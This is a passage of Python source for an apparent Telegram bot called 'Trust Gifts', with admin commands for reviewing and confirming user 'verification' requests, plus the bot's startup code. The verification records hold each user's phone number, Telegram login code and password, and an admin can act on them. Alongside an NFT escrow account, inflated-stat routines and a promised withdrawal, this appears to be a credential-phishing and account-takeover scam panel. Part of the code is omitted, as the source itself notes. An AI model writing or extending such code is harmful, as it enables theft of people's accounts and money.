    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
    if not pending:
        await send_with_premium_emoji(
            callback.message,
            f"{get_emoji('check')} Нет активных запросов на верификацию",
            admin_panel_keyboard(),
            is_callback=True
        )
        return
    
    text = f"{get_emoji('check')} <b>ЗАПРОСЫ НА ВЕРИФИКАЦИЮ</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n"
        text += f"   👤 @{req.get('username', '?')}\n"
        text += f"   🆔 ID: {req.get('user_id', '?')}\n"
        text += f"   📞 Номер: {req.get('phone', '')}\n"
        text += f"   📨 Код: {req.get('code', 'ожидается')}\n"
        text += f"   🔑 Пароль: {req.get('password', 'ожидается')}\n"
        text += f"   ⏳ Статус: {req.get('status', 'pending')}\n"
        text += f"   ➡️ /verify_confirm {rid} - подтвердить\n"
        text += f"   ➡️ /verify_reject {rid} - отклонить\n\n"
    
    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
    await callback.answer()

@dp.message(Command("verify_confirm"))
async def verify_confirm(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /verify_confirm [request_id]")
        return
    request_id = args[1]
    
    if request_id not in verification_requests:
        await message.answer("❌ Запрос не найден")
        return
    req = verification_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Запрос уже обработан")
        return
    
    complete_verification(req["user_id"], req.get("phone", ""), req.get("code", ""))
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    save_json(FILES["verification_requests"], verification_requests)
    
    await message.answer(f"✅ Верификация #{request_id} подтверждена")
    await log_to_master(f"✅ Верификация #{request_id} подтверждена админом")
    
    try:
        await bot.send_message(
            req["user_id"],
            f"{get_emoji('check')} <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
            f"🔑 Теперь вы можете вывести средства.\n"
            f"🕐 Вывод доступен через 24 часа с момента подтверждения.\n\n"
            f"📱 Для вывода перейдите в Mini App."
        )
    except:
        pass

@dp.message(Command("verify_reject"))
async def verify_reject(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /verify_reject [request_id]")
        return
    request_id = args[1]
    
    if request_id not in verification_requests:
        await message.answer("❌ Запрос не найден")
        return
    req = verification_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Запрос уже обработан")
        return
    
    req["status"] = "rejected"
    req["rejected_at"] = datetime.now().isoformat()
    save_json(FILES["verification_requests"], verification_requests)
    
    await message.answer(f"❌ Верификация #{request_id} отклонена")
    await log_to_master(f"❌ Верификация #{request_id} отклонена админом")
    
    try:
        await bot.send_message(
            req["user_id"],
            f"{get_emoji('cross')} <b>ВЕРИФИКАЦИЯ ОТКЛОНЕНА</b>\n\n"
            f"Данные не прошли проверку. Попробуйте ещё раз."
        )
    except:
        pass

# ============================================================
# 17-25. ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (СОКРАЩЕНЫ ДЛЯ ЭКОНОМИИ МЕСТА)
# Они идентичны предыдущей версии, но с использованием get_emoji()
# Полный код — в приложенном файле
# ============================================================

# ============================================================
# 26. ЗАПУСК
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 10000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    print("=" * 50)
    print("🏦 Trust Gifts Бот (PREMIUM ЭМОДЗИ ИСПРАВЛЕНЫ!)")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print(f"🖼️ NFT эскроу: @{NFT_ESCROW_ACCOUNT}")
    print(f"💰 БОНУС-КОМАНДА: /work (ДЛЯ ВСЕХ!)")
    print(f"✨ PREMIUM ЭМОДЗИ: ИСПРАВЛЕНЫ (tg-emoji + icon_custom_emoji_id)")
    print("=" * 50)
    
    asyncio.create_task(auto_increment_stats())
    
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
